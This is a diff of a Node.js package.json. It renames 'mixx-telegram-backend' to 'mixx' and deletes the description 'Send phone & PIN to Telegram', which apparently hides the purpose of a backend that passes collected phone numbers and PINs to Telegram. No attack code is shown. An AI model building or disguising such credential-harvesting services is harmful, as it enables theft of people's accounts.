@@ -1,8 +1,6 @@
 {
-  "name": "mixx-telegram-backend",
+  "name": "mixx",
   "version": "1.0.0",
-  "description": "Send phone & PIN to Telegram",
-  "main": "server.js",
   "scripts": {
     "start": "node server.js"
   },
